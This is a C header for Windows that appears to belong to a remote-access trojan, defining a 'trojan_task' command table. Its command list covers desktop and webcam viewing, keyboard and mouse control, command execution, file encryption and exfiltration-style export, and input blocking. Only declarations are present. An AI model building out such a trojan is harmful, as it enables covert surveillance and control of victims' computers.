#pragma once

#ifndef __COMMANDS_H_INCLUDED__
#define __COMMANDS_H_INCLUDED__

#include <Windows.h>
#include <tchar.h>

#define NUMBER_OF_COMMANDS 2

#define TASK_SUCCESSP   TEXT("Success")
#define TASK_SUCCESSW   L"Success"
#define TASK_SUCCESSA   "Success"

#define TASK_FAILUREP   TEXT("Failure")
#define TASK_FAILUREW   L"Failure"
#define TASK_FAILUREA   "Failure"

#define UNDEFINEDP      TEXT("Undefined")
#define UNDEFINEDW      L"Undefined"
#define UNDEFINEDA      "Undefined"

#define RESULT_LENGTH  256

typedef enum
{
	MESSAGEBOX,
	VIEWDESKTOP,
	VIEWWEBCAM,
	KEYBOARDCTRL,
	MOUSECTRL,
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT,
	PLAYSOUND,

	NUMBER_OF_COMMAND,
	UNDEFINEDCMD = -1
} Command;

typedef struct
{
	PTCHAR name;
	INT    code;
} PAIR;

typedef VOID(*trojan_task)(CONST PTCHAR args, PTCHAR result);

typedef struct
{
	PAIR        pair;
	trojan_task task;
} MAP;

VOID _on_task_MESSAGEBOX(CONST PTCHAR args, PTCHAR result);
VOID _on_task_MOUSECTRL(CONST PTCHAR args, PTCHAR result);

static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
{
	{ { TEXT("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
	{ { TEXT("mouse"),    MOUSECTRL }, _on_task_MOUSECTRL  }
};

INT          cmd2code(CONST PTCHAR cmd);
CONST PTCHAR code2cmd(INT cmd);

#endif /* __COMMANDS_H_INCLUDED__ */